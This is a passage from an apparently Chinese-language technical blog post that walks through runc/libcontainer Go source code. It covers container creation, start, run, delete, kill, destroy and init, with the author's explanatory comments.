&#123;</span><br><span class="line">logrus.Warn(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> newSystemErrorWithCause(err, <span class="string">"starting container process"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// generate a timestamp indicating when the container was started</span></span><br><span class="line">c.created = time.Now().UTC()</span><br><span class="line">c.state = &amp;runningState&#123;</span><br><span class="line">c: c,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> isInit &#123;</span><br><span class="line">c.state = &amp;createdState&#123;</span><br><span class="line">c: c,</span><br><span class="line">&#125;</span><br><span class="line">state, err := c.updateState(parent)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">c.initProcessStartTime = state.InitProcessStartTime</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> c.config.Hooks != <span class="literal">nil</span> &#123;</span><br><span class="line">s := configs.HookState&#123;</span><br><span class="line">Version:    c.config.Version,</span><br><span class="line">ID:         c.id,</span><br><span class="line">Pid:        parent.pid(),</span><br><span class="line">Root:       c.config.Rootfs,</span><br><span class="line">BundlePath: utils.SearchLabels(c.config.Labels, <span class="string">"bundle"</span>),</span><br><span class="line">&#125;</span><br><span class="line">            <span class="comment">//启动hook函数</span></span><br><span class="line"><span class="keyword">for</span> i, hook := <span class="keyword">range</span> c.config.Hooks.Poststart &#123;</span><br><span class="line"><span class="keyword">if</span> err := hook.Run(s); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := parent.terminate(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">logrus.Warn(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> newSystemErrorWithCausef(err, <span class="string">"running poststart hook %d"</span>, i)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>newParentProcess函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *linuxContainer)</span> <span class="title">newParentProcess</span><span class="params">(p *Process, doInit <span class="keyword">bool</span>)</span> <span class="params">(parentProcess, error)</span></span> &#123;</span><br><span class="line">parentPipe, childPipe, err := newPipe()<span class="comment">//新建管道</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, newSystemErrorWithCause(err, <span class="string">"creating new init pipe"</span>)</span><br><span class="line">&#125;</span><br><span class="line">rootDir, err := os.Open(c.root) <span class="comment">//打开rootdir路径</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">cmd, err := c.commandTemplate(p, childPipe, rootDir)<span class="comment">//返回template模版</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, newSystemErrorWithCause(err, <span class="string">"creating new command template"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> !doInit &#123;</span><br><span class="line">        <span class="comment">//new set namespace process</span></span><br><span class="line"><span class="keyword">return</span> c.newSetnsProcess(p, cmd, parentPipe, childPipe, rootDir)</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//new init process</span></span><br><span class="line"><span class="keyword">return</span> c.newInitProcess(p, cmd, parentPipe, childPipe, rootDir)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>newSetnsProcess函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *linuxContainer)</span> <span class="title">newSetnsProcess</span><span class="params">(p *Process, cmd *exec.Cmd, parentPipe, childPipe, rootDir *os.File)</span> <span class="params">(*setnsProcess, error)</span></span> &#123;</span><br><span class="line">cmd.Env = <span class="built_in">append</span>(cmd.Env, <span class="string">"_LIBCONTAINER_INITTYPE="</span>+<span class="keyword">string</span>(initSetns))</span><br><span class="line">state, err := c.currentState()<span class="comment">//获取当前状态</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, newSystemErrorWithCause(err, <span class="string">"getting container's current state"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// for setns process, we dont have to set cloneflags as the process namespaces</span></span><br><span class="line"><span class="comment">// will only be set via setns syscall</span></span><br><span class="line">    <span class="comment">// bootstrapData</span></span><br><span class="line">data, err := c.bootstrapData(<span class="number">0</span>, state.NamespacePaths, p.consolePath)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> set on container for process management</span></span><br><span class="line"><span class="keyword">return</span> &amp;setnsProcess&#123;</span><br><span class="line">cmd:           cmd,</span><br><span class="line">cgroupPaths:   c.cgroupManager.GetPaths(),</span><br><span class="line">childPipe:     childPipe,</span><br><span class="line">parentPipe:    parentPipe,</span><br><span class="line">config:        c.newInitConfig(p),</span><br><span class="line">process:       p,</span><br><span class="line">bootstrapData: data,</span><br><span class="line">rootDir:       rootDir,</span><br><span class="line">&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>newInitProcess函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *linuxContainer)</span> <span class="title">newInitProcess</span><span class="params">(p *Process, cmd *exec.Cmd, parentPipe, childPipe, rootDir *os.File)</span> <span class="params">(*initProcess, error)</span></span> &#123;</span><br><span class="line">cmd.Env = <span class="built_in">append</span>(cmd.Env, <span class="string">"_LIBCONTAINER_INITTYPE="</span>+<span class="keyword">string</span>(initStandard))</span><br><span class="line">nsMaps := <span class="built_in">make</span>(<span class="keyword">map</span>[configs.NamespaceType]<span class="keyword">string</span>)</span><br><span class="line"><span class="keyword">for</span> _, ns := <span class="keyword">range</span> c.config.Namespaces &#123;</span><br><span class="line"><span class="keyword">if</span> ns.Path != <span class="string">""</span> &#123;</span><br><span class="line">nsMaps[ns.Type] = ns.Path  <span class="comment">//namespace映射关系</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">_, sharePidns := nsMaps[configs.NEWPID]</span><br><span class="line">data, err := c.bootstrapData(c.config.Namespaces.CloneFlags(), nsMaps, <span class="string">""</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &amp;initProcess&#123;</span><br><span class="line">cmd:           cmd,</span><br><span class="line">childPipe:     childPipe,</span><br><span class="line">parentPipe:    parentPipe,</span><br><span class="line">manager:       c.cgroupManager,</span><br><span class="line">config:        c.newInitConfig(p),</span><br><span class="line">container:     c,</span><br><span class="line">process:       p,</span><br><span class="line">bootstrapData: data,</span><br><span class="line">sharePidns:    sharePidns,</span><br><span class="line">rootDir:       rootDir,</span><br><span class="line">&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Start命令过程：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Action: <span class="function"><span class="keyword">func</span><span class="params">(context *cli.Context)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">container, err := getContainer(context) <span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">status, err := container.Status() <span class="comment">//获取容器状态</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> status &#123;</span><br><span class="line"><span class="keyword">case</span> libcontainer.Created:  <span class="comment">//状态时已经创建，则执行启动</span></span><br><span class="line"><span class="keyword">return</span> container.Exec()</span><br><span class="line"><span class="keyword">case</span> libcontainer.Stopped:   <span class="comment">// 已经停止，这个停止时进程已经没有了。docker stop是pause状态。</span></span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"cannot start a container that has run and stopped"</span>)</span><br><span class="line"><span class="keyword">case</span> libcontainer.Running:  <span class="comment">// 已经启动</span></span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"cannot start an already running container"</span>)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"cannot start a container in the %s state"</span>, status)</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>getContainer函数，获取容器实例对象</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// getContainer returns the specified container instance by loading it from state</span></span><br><span class="line"><span class="comment">// with the default factory.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getContainer</span><span class="params">(context *cli.Context)</span> <span class="params">(libcontainer.Container, error)</span></span> &#123;</span><br><span class="line">id := context.Args().First()</span><br><span class="line"><span class="keyword">if</span> id == <span class="string">""</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, errEmptyID</span><br><span class="line">&#125;</span><br><span class="line">factory, err := loadFactory(context)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> factory.Load(id)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exec执行：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *linuxContainer)</span> <span class="title">Exec</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">c.m.Lock()</span><br><span class="line"><span class="keyword">defer</span> c.m.Unlock()</span><br><span class="line"><span class="keyword">return</span> c.exec() <span class="comment">//调用exec函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *linuxContainer)</span> <span class="title">exec</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="comment">//打开path路径</span></span><br><span class="line">path := filepath.Join(c.root, execFifoFilename)</span><br><span class="line">    <span class="comment">//打开fifo文件</span></span><br><span class="line">f, err := os.OpenFile(path, os.O_RDONLY, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> newSystemErrorWithCause(err, <span class="string">"open exec fifo for reading"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> f.Close()</span><br><span class="line">    <span class="comment">//读取文件数据</span></span><br><span class="line">data, err := ioutil.ReadAll(f)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(data) &gt; <span class="number">0</span> &#123;</span><br><span class="line">os.Remove(path)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"cannot start an already running container"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Run命令启动：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Action: <span class="function"><span class="keyword">func</span><span class="params">(context *cli.Context)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">spec, err := setupSpec(context)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">status, err := startContainer(context, spec, <span class="literal">false</span>)</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// exit with the container's exit status so any external supervisor is</span></span><br><span class="line"><span class="comment">// notified of the exit with the correct exit status.</span></span><br><span class="line">os.Exit(status)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>调用setupSpec函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// setupSpec performs inital setup based on the cli.Context for the container</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">setupSpec</span><span class="params">(context *cli.Context)</span> <span class="params">(*specs.Spec, error)</span></span> &#123;</span><br><span class="line">bundle := context.String(<span class="string">"bundle"</span>)</span><br><span class="line"><span class="keyword">if</span> bundle != <span class="string">""</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := os.Chdir(bundle); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">spec, err := loadSpec(specConfig) <span class="comment">//加载spec文件</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">notifySocket := os.Getenv(<span class="string">"NOTIFY_SOCKET"</span>)</span><br><span class="line"><span class="keyword">if</span> notifySocket != <span class="string">""</span> &#123;</span><br><span class="line">setupSdNotify(spec, notifySocket)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> os.Geteuid() != <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">"runc should be run as root"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> spec, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>startContainer函数执行过程和create类似。</p><p>delete命令：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">Action: <span class="function"><span class="keyword">func</span><span class="params">(context *cli.Context)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> !context.Args().Present() &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"runc: \"delete\" requires a minimum of 1 argument"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">factory, err := loadFactory(context)  <span class="comment">//加载</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, id := <span class="keyword">range</span> context.Args() &#123;</span><br><span class="line">container, err := factory.Load(id)  <span class="comment">//加载指定的id的容器</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> lerr, ok := err.(libcontainer.Error); ok &amp;&amp; lerr.Code() == libcontainer.ContainerNotExists &#123;</span><br><span class="line"><span class="comment">// if there was an aborted start or something of the sort then the container's directory could exist but</span></span><br><span class="line"><span class="comment">// libcontainer does not see it because the state.json file inside that directory was never created.</span></span><br><span class="line">path := filepath.Join(context.GlobalString(<span class="string">"root"</span>), id)</span><br><span class="line"><span class="keyword">if</span> err := os.RemoveAll(path); err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Fprintf(os.Stderr, <span class="string">"remove %s: %v\n"</span>, path, err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Fprintf(os.Stderr, <span class="string">"container %s is not exist\n"</span>, id)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">s, err := container.Status() <span class="comment">//获取容器状态</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Fprintf(os.Stderr, <span class="string">"status for %s: %v\n"</span>, id, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> s &#123;</span><br><span class="line"><span class="keyword">case</span> libcontainer.Stopped:  <span class="comment">//已经停止，就销毁</span></span><br><span class="line">destroy(container)</span><br><span class="line"><span class="keyword">case</span> libcontainer.Created: <span class="comment">//创建，删掉</span></span><br><span class="line">err := killContainer(container)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Fprintf(os.Stderr, <span class="string">"kill container %s: %v\n"</span>, id, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">if</span> context.Bool(<span class="string">"force"</span>) &#123;</span><br><span class="line">err := killContainer(container)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Fprintf(os.Stderr, <span class="string">"kill container %s: %v\n"</span>, id, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Fprintf(os.Stderr, <span class="string">"cannot delete container %s that is not stopped: %s\n"</span>, id, s)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>killcontainer函数，发送信号，销毁进程。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">killContainer</span><span class="params">(container libcontainer.Container)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">container.Signal(syscall.SIGKILL)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">100</span>; i++ &#123;</span><br><span class="line">time.Sleep(<span class="number">100</span> * time.Millisecond)</span><br><span class="line"><span class="keyword">if</span> err := container.Signal(syscall.Signal(<span class="number">0</span>)); err != <span class="literal">nil</span> &#123; <span class="comment">//如果发送信息失败，强制销毁</span></span><br><span class="line">destroy(container)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"container init still running"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>destroy函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">destroy</span><span class="params">(c *linuxContainer)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> !c.config.Namespaces.Contains(configs.NEWPID) &#123; <span class="comment">//配置pid</span></span><br><span class="line"><span class="keyword">if</span> err := killCgroupProcesses(c.cgroupManager); err != <span class="literal">nil</span> &#123;</span><br><span class="line">logrus.Warn(err) <span class="comment">//杀死cgroup进程</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">err := c.cgroupManager.Destroy()  <span class="comment">//销毁cgroupManager</span></span><br><span class="line"><span class="keyword">if</span> rerr := os.RemoveAll(c.root); err == <span class="literal">nil</span> &#123;  <span class="comment">//删除路径信息</span></span><br><span class="line">err = rerr</span><br><span class="line">&#125;</span><br><span class="line">c.initProcess = <span class="literal">nil</span></span><br><span class="line"><span class="keyword">if</span> herr := runPoststopHooks(c); err == <span class="literal">nil</span> &#123;  <span class="comment">//runPostStopHook</span></span><br><span class="line">err = herr</span><br><span class="line">&#125;</span><br><span class="line">c.state = &amp;stoppedState&#123;c: c&#125;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>initCommand命令调用初始化函数:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> initCommand = cli.Command&#123;</span><br><span class="line">Name:  <span class="string">"init"</span>,</span><br><span class="line">Usage: <span class="string">`initialize the namespaces and launch the process (do not call it outside of runc)`</span>,</span><br><span class="line">Action: <span class="function"><span class="keyword">func</span><span class="params">(context *cli.Context)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">factory, _ := libcontainer.New(<span class="string">""</span>)</span><br><span class="line"><span class="keyword">if</span> err := factory.StartInitialization(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// as the error is sent back to the parent there is no need to log</span></span><br><span class="line"><span class="comment">// or write it to stderr because the parent process will handle this</span></span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">"libcontainer: container init failed to exec"</span>)</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// StartInitialization loads a container by opening the pipe fd from the parent to read the configuration and state</span></span><br><span class="line"><span class="comment">// This is a low level implementation detail of the reexec and should not be consumed externally</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *LinuxFactory)</span> <span class="title">StartInitialization</span><span class="params">()</span> <span class="params">(err error)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> pipefd, rootfd <span class="keyword">int</span></span><br><span class="line"><span class="keyword">for</span> _, pair := <span class="keyword">range</span> []<span class="keyword">struct</span> &#123;</span><br><span class="line">k <span class="keyword">string</span></span><br><span class="line">v *<span class="keyword">int</span></span><br><span class="line">&#125;&#123;</span><br><span class="line">&#123;<span class="string">"_LIBCONTAINER_INITPIPE"</span>, &amp;pipefd&#125;,</span><br><span class="line">&#123;<span class="string">"_LIBCONTAINER_STATEDIR"</span>, &amp;rootfd&#125;,</span><br><span class="line">&#125; &#123;</span><br><span class="line"></span><br><span class="line">s := os.Getenv(pair.k)</span><br><span class="line"></span><br><span class="line">i, err := strconv.Atoi(s)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"unable to convert %s=%s to int"</span>, pair.k, s)</span><br><span class="line">&#125;</span><br><span class="line">*pair.v = i</span><br><span class="line">&#125;</span><br><span 